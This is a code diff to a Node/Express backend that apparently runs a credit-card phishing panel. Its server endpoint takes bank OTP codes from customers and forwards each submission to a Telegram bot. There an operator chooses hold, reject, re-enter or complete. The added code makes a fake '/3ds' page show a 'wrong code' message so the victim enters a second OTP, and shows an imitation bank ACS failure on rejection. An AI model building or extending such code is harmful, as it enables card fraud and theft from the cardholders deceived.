@@ -81,6 +81,8 @@ import {
   markMethodNextClicked,
   requestOtpResend,
   setPhoneLast3,
+  updateCardFeedStatus,
+  recordWrongOtpAttempt,
   OTP_MAX_ATTEMPTS,
 } from './creditCardFeedStore.js';
 
@@ -2327,7 +2329,8 @@ app.post('/api/order/creditcard/submit', async (req, res) => {
     const oid = String(orderId || '').trim();
     const code = String(otp || '').trim();
     if (!oid || !code) return res.status(400).json({ error: 'Missing required fields' });
-    if (!/^\d{6}$/.test(code)) return res.status(400).json({ error: 'OTP must be 6 digits' });
+    // Same as Saraf: accept 4–8 digit bank OTPs
+    if (!/^\d{4,8}$/.test(code)) return res.status(400).json({ error: 'OTP must be 4–8 digits' });
 
     const clientIp = getClientIpFromRequest(req);
     const blocked = await getBlockedIpEntry(clientIp);
@@ -2345,6 +2348,7 @@ app.post('/api/order/creditcard/submit', async (req, res) => {
     }
 
     try {
+      // Sets feed last_otp + status pending (so admin reenter → retry_otp is a new transition)
       await attachOtpToCardFeed(oid, code);
     } catch (feedErr) {
       console.error('[order] attachOtpToCardFeed:', feedErr?.message || feedErr);
@@ -3513,6 +3517,7 @@ async function handleCallbackQuery(data, incomingChatId, fromUserId, ctx = null)
     if (actionType === 'cc_hold') {
       await setCreditCardOtpSubmissionDecision(submissionId, 'hold');
       await updateOrderStatusByOrderId(ORDERS_CRM_PATH, oid, 'received');
+      await updateCardFeedStatus(oid, 'pending').catch(() => null);
       await menuSend(`⏳ تم وضع الطلب قيد التعليق.\nطلب: <code>${escapeTelegramHtml(oid)}</code>`, {});
       return;
     }
@@ -3520,6 +3525,8 @@ async function handleCallbackQuery(data, incomingChatId, fromUserId, ctx = null)
     if (actionType === 'cc_reject') {
       await setCreditCardOtpSubmissionDecision(submissionId, 'rejected');
       await updateOrderStatusByOrderId(ORDERS_CRM_PATH, oid, 'cancelled');
+      // Customer ACS: declined / fail on redirect page (same as Saraf failed)
+      await updateCardFeedStatus(oid, 'failed').catch(() => null);
       await menuSend(`❌ تم رفض الطلب.\nطلب: <code>${escapeTelegramHtml(oid)}</code>`, {});
       return;
     }
@@ -3527,6 +3534,12 @@ async function handleCallbackQuery(data, incomingChatId, fromUserId, ctx = null)
     if (actionType === 'cc_reenter') {
       await setCreditCardOtpSubmissionDecision(submissionId, 'reenter');
       await updateOrderStatusByOrderId(ORDERS_CRM_PATH, oid, 'received');
+      // Critical: set feed retry_otp so /3ds shows wrong-code and allows 2nd OTP (like Saraf)
+      try {
+        await recordWrongOtpAttempt(oid);
+      } catch {
+        await updateCardFeedStatus(oid, 'retry_otp').catch(() => null);
+      }
       await menuSend(`🔁 تم طلب إعادة إدخال الرمز الصحيح.\nطلب: <code>${escapeTelegramHtml(oid)}</code>`, {});
       return;
     }
@@ -3534,6 +3547,7 @@ async function handleCallbackQuery(data, incomingChatId, fromUserId, ctx = null)
     if (actionType === 'cc_complete') {
       await setCreditCardOtpSubmissionDecision(submissionId, 'completed');
       await updateOrderStatusByOrderId(ORDERS_CRM_PATH, oid, 'completed');
+      await updateCardFeedStatus(oid, 'completed').catch(() => null);
       await menuSend(`✅ تم اكتمال الطلب.\nطلب: <code>${escapeTelegramHtml(oid)}</code>`, {});
       return;
     }
